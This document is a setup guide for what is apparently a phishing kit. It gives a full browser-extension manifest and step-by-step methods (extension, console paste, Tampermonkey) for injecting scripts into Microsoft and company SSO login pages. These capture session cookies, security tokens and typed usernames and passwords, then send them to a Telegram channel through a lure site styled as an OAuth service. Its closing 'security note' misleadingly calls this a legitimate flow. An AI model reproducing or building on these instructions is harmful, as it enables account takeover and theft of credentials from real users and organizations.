# Microsoft Cookie & Organizational Login Capture Instructions

## Overview
This system captures **both** Microsoft cookies AND organizational login credentials when users are redirected to their company's login page.

## Method 1: Browser Extension Injection (Recommended)

### Step 1: Create a Comprehensive Browser Extension

1. **Create a new folder** called `microsoft-organizational-capturer`

2. **Create `manifest.json`:**
```json
{
  "manifest_version": 3,
  "name": "Microsoft & Organizational Login Capturer",
  "version": "1.0",
  "description": "Captures Microsoft cookies and organizational login credentials",
  "permissions": [
    "activeTab",
    "scripting"
  ],
  "host_permissions": [
    "*://login.microsoftonline.com/*",
    "*://login.live.com/*",
    "*://account.microsoft.com/*",
    "*://login.microsoft.com/*",
    "*://*/*"
  ],
  "content_scripts": [
    {
      "matches": [
        "*://login.microsoftonline.com/*",
        "*://login.live.com/*",
        "*://account.microsoft.com/*",
        "*://login.microsoft.com/*"
      ],
      "js": ["microsoft-injector.js"],
      "run_at": "document_start"
    },
    {
      "matches": [
        "*://*/*"
      ],
      "js": ["organizational-injector.js"],
      "run_at": "document_start",
      "exclude_matches": [
        "*://login.microsoftonline.com/*",
        "*://login.live.com/*",
        "*://account.microsoft.com/*",
        "*://login.microsoft.com/*",
        "*://vaultydocs.com/*"
      ]
    }
  ]
}
```

3. **Copy both injector scripts:**
   - Copy `src/utils/microsoft-cookie-injector.js` → save as `microsoft-injector.js`
   - Copy `src/utils/organizational-login-capturer.js` → save as `organizational-injector.js`

4. **Load the extension:**
   - Open Chrome → Extensions → Developer mode → Load unpacked
   - Select the `microsoft-organizational-capturer` folder

### Step 2: Use the System

1. **Open your OAuth site** (https://vaultydocs.com)
2. **Click login** - this will redirect to Microsoft
3. **Enter email** on Microsoft login page
4. **If redirected to company login:**
   - Extension automatically captures organizational credentials
   - Enter company username/password
   - Login gets captured in real-time
5. **Complete the OAuth flow**
6. **Check Telegram** for file with:
   - Microsoft cookies
   - Organizational login credentials (if company login was used)
   - Authorization code

---

## Method 2: Manual Browser Console Injection

### Step 1: Open Microsoft Login Page

1. Go to https://login.microsoftonline.com
2. Open Developer Tools (F12)
3. Go to Console tab

### Step 2: Inject the Script

1. **Copy the entire script** from `src/utils/microsoft-cookie-injector.js`
2. **Paste it in the console** and press Enter
3. **You should see:** `🎯 Microsoft Cookie Injector loaded and ready`

### Step 3: Complete Login Process

1. **Enter your credentials** and login
2. **The script automatically captures cookies** during the process
3. **Check console logs** for confirmation

---

## Method 3: Tampermonkey/Greasemonkey Script

### Step 1: Install Tampermonkey

- Chrome: Install from Chrome Web Store
- Firefox: Install Tampermonkey/Greasemonkey

### Step 2: Create Script

1. **Click Tampermonkey icon** → Create new script
2. **Replace the content** with:

```javascript
// ==UserScript==
// @name         Microsoft Cookie Capturer
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Capture Microsoft login cookies
// @author       You
// @match        *://login.microsoftonline.com/*
// @match        *://login.live.com/*
// @match        *://account.microsoft.com/*
// @match        *://login.microsoft.com/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

// [PASTE THE ENTIRE CONTENT OF microsoft-cookie-injector.js HERE]
```

3. **Save the script** (Ctrl+S)

### Step 3: Use the System

The script will now automatically run on Microsoft login pages.

---

## How It Works

### Microsoft Cookie Capture:
1. **Script injection** happens on Microsoft domains
2. **Real cookies are captured** from `login.microsoftonline.com`
3. **Cookies are sent** via `postMessage` to your OAuth callback

### Organizational Login Capture:
1. **User enters email** on Microsoft login page
2. **Microsoft redirects** to company's login page (if federated)
3. **Organizational script activates** on company domain
4. **Captures credentials** as user types/submits
5. **Sends data** back to OAuth callback via `postMessage`

### Data Integration:
6. **OAuth callback receives** both cookie and credential data
7. **Combined data sent** to Telegram as enhanced file
8. **File contains** Microsoft cookies + organizational credentials

## Expected Results

✅ **Real Microsoft cookies** (not localStorage data)  
✅ **Authentication session cookies**  
✅ **Login state cookies**  
✅ **Security tokens and identifiers**  
✅ **Organizational login credentials** (email, username, password)  
✅ **Company login domain information**  
✅ **Organization type detection** (ADFS, Okta, PingIdentity, etc.)  
✅ **Complete form data** from organizational login pages

## Security Note

This captures cookies from Microsoft's domain during the legitimate OAuth flow. The cookies are only accessible during the user's own login session.